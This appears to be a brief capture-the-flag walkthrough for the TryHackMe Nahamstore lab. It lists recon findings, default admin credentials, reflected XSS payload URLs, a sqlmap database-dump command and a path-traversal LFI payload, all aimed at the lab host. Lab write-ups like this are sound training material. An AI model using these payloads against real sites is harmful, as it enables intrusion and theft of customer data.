# nahamstore-thm-ctf
Walk through THM Nahamstore 

## Recon 

- When enumerating subdomains you should perform it against the nahamstore.com domain. When you find a subdomain you'll need to add an entry into your /etc/hosts or c:\windows\system32\drivers\etc\hosts file pointing towards your deployed TryHackMe box IP

- replace the `.com` to `thm`


### PII leaks

`http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2`



## Nmap Scan

```bash

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 62
```



### ANother server

```
http://nahamstore.thm:8000/admin
admin:admin
```







## Subfinder - Subdomain Enumeration
- Vhost enumeration also 
- use `gobuster`




### Xss

```
http://nahamstore.thm/account/orders/4%3Cscript%3Ealert()%3C/script%3E
http://nahamstore.thm/uploads/spelers_NL1_2025.xlsx%3Cu%3Etest%3C/u%3E
http://nahamstore.thm/uploads/spelers_NL1_2025.xlsx%3Cscript%3Ealert()%3C/script%3E
http://nahamstore.thm/favicon.ico?qcd=qlfdz3ffam2hnlsp%3cscript%3ealert(1)%3c%2fscript%3eksrxd
http://nahamstore.thm/product?id=1&name=%27&discount=ibpj7m12mo%22onfocus%3d%22alert(1)%22autofocus%3d%22xzg4z





```


### dirbusting


```
http://nahamstore.thm/FUZZ
http://nahamstore.thm/staff
http://nahamstore.thm/uploads


```


### SQL

```bash
sqlmap -u 'http://nahamstore.thm/product?id=1' -p id --batch --dbms=mysql --dump -threads 10 --ignore-code 404

```



### LFI

```

http://nahamstore.thm/product/picture/?file=....//....//....//....//....//....//....//....//....//....//....//....//lfi/flag.txt

```